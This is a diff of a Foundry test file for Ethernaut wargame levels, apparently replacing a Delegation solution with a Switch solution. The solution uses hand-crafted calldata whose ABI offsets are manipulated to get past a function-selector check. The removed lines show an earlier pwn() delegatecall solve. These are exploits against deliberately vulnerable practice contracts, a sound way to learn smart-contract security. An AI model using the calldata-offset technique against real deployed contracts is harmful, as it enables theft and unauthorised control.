@@ -4,14 +4,14 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Delegation} from "src/levels/Delegation.sol";
-import {DelegationFactory} from "src/levels/DelegationFactory.sol";
+import {Switch} from "src/levels/Switch.sol";
+import {SwitchFactory} from "src/levels/SwitchFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestDelegation is Test, Utils {
+contract TestSwitch is Test, Utils {
     Ethernaut ethernaut;
-    Delegation instance;
+    Switch instance;
 
     address payable owner;
     address payable player;
@@ -31,12 +31,12 @@ contract TestDelegation is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DelegationFactory factory = new DelegationFactory();
+        SwitchFactory factory = new SwitchFactory();
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Delegation(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        instance = Switch(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
         vm.stopPrank();
     }
 
@@ -46,7 +46,7 @@ contract TestDelegation is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.prank(player);
+        vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
 
@@ -54,8 +54,21 @@ contract TestDelegation is Test, Utils {
     function testSolve() public {
         vm.startPrank(player);
 
-        (bool success,) = address(instance).call(abi.encodeWithSignature("pwn()"));
-        require(success, "call not successful");
+        bytes memory data = abi.encodeWithSelector(
+            bytes4(keccak256("flipSwitch(bytes)")), abi.encodeWithSelector(bytes4(keccak256("turnSwitchOff()")))
+        );
+        (bool success, bytes memory err) = address(instance).call(data);
+        if (!success) {
+            console.logBytes(err);
+        }
+        assertTrue(!instance.switchOn());
+
+        data =
+            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff20606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
+        (success, err) = address(instance).call(data);
+        if (!success) {
+            console.logBytes(err);
+        }
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
